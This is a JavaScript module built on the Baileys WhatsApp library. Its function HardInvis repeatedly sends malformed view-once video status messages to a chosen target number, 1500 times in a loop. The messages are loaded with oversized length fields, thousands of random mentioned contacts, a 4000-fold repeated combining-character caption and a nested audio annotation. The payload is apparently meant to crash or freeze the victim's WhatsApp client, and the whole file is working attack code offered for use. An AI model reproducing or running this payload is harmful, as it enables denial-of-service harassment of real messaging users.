// lib/rizoinvis.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function HardInvis(sock, targetJid) {
  if (!sock || !targetJid) {
    console.error("❌ [HardInvis Error]: Socket ya Target JID missing hai!");
    return false;
  }

  try {
    const audioMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
      fileLength: 99999999999999,
      seconds: 99999999999999,
      ptt: true,
      mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
      fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
      directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc",
      mediaKeyTimestamp: 99999999999999,
      contextInfo: {
        mentionedJid: [
          "@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
          ),
        ],
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363375427625764@newsletter",
          serverMessageId: 1,
          newsletterName: "Rizofuck Power x Proto",
        },
      },
      waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==",
    };

    const videoMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: 289511,
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "ោ៝".repeat(4000),
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc",
      mediaKeyTimestamp: 1743848703,
      contextInfo: {
        isSampled: true,
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
          ),
        ],
      },
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363321780343299@newsletter",
        serverMessageId: 1,
        newsletterName: "",
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      annotations: [
        {
          embeddedContent: { audioMessage },
          embeddedAction: true,
        },
      ],
    };

    console.log(`⚡ [HardInvis]: Starting payload sequence for ${targetJid}`);

    for (let i = 0; i < 1500; i++) {
      try {
        const msg = generateWAMessageFromContent(
          targetJid,
          { viewOnceMessage: { message: { videoMessage } } },
          {}
        );

        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [targetJid],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [{ tag: "to", attrs: { jid: targetJid }, content: undefined }],
                },
              ],
            },
          ],
        });

        await sock.relayMessage(
          targetJid,
          {
            groupStatusMentionMessage: {
              message: { protocolMessage: { key: msg.key, type: 25 } },
            },
          },
          {
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined,
              },
            ],
          }
        );

        if (i % 50 === 0) {
          console.log(`🔄 [HardInvis]: Sent ${i}/1500 packets to ${targetJid}`);
        }

        if (i < 99) {
          await sleep(3000); // Optimized delay for stability & power
        }
      } catch (innerErr) {
        // Individual packet error catch taaki loop na ruke
        continue;
      }
    }
    console.log(`✅ [HardInvis]: Successfully completed sequence for ${targetJid}`);
    return true;
  } catch (err) {
    console.error("❌ [HardInvis Critical Error]:", err);
    return false;
  }
}

module.exports = { HardInvis };
